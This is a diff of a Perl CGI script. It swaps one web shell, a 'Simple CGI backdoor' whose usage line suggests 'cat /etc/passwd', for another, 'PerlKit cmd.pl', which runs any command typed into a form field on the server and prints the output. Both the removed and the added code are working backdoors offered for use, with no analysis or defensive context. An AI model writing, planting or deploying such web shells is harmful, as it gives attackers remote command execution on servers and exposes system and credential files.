@@ -1,34 +1,67 @@
-#!/usr/bin/perl -w
+#!/usr/bin/perl
+#
+# PerlKit-0.1 - http://www.t0s.org
+#
+# cmd.pl: Run commands on a webserver
 
 use strict;
 
-print "Cache-Control: no-cache\n";
-print "Content-type: text/html\n\n";
+my ($cmd, %FORM);
 
-my $req = $ENV{QUERY_STRING};
-	chomp ($req);
-	$req =~ s/%20/ /g; 
-	$req =~ s/%3b/;/g;
+$|=1;
 
-print "<html><body>";
+print "Content-Type: text/html\r\n";
+print "\r\n";
 
-print '<!-- Simple CGI backdoor by DK (http://michaeldaw.org) -->';
+# Get parameters
 
-	if (!$req) {
-		print "Usage: http://target.com/perlcmd.cgi?cat /etc/passwd";
-	}
-	else {
-		print "Executing: $req";
-	}
+%FORM = parse_parameters($ENV{'QUERY_STRING'});
 
-	print "<pre>";
-	my @cmd = `$req`;
-	print "</pre>";
+if(defined $FORM{'cmd'}) {
+  $cmd = $FORM{'cmd'};
+}
 
-	foreach my $line (@cmd) {
-		print $line . "<br/>";
-	}
+print '<HTML>
+<body>
+<form action="" method="GET">
+<input type="text" name="cmd" size=45 value="' . $cmd . '">
+<input type="submit" value="Run">
+</form>
+<pre>';
 
-print "</body></html>";
+if(defined $FORM{'cmd'}) {
+  print "Results of '$cmd' execution:\n\n";
+  print "-"x80;
+  print "\n";
 
-# <!--    http://michaeldaw.org   2006    -->
+  open(CMD, "($cmd) 2>&1 |") || print "Could not execute command";
+
+  while(<CMD>) {
+    print;
+  }
+
+  close(CMD);
+  print "-"x80;
+  print "\n";
+}
+
+print "</pre>";
+
+sub parse_parameters ($) {
+  my %ret;
+
+  my $input = shift;
+
+  foreach my $pair (split('&', $input)) {
+    my ($var, $value) = split('=', $pair, 2);
+    
+    if($var) {
+      $value =~ s/\+/ /g ;
+      $value =~ s/%(..)/pack('c',hex($1))/eg;
+
+      $ret{$var} = $value;
+    }
+  }
+
+  return %ret;
+}
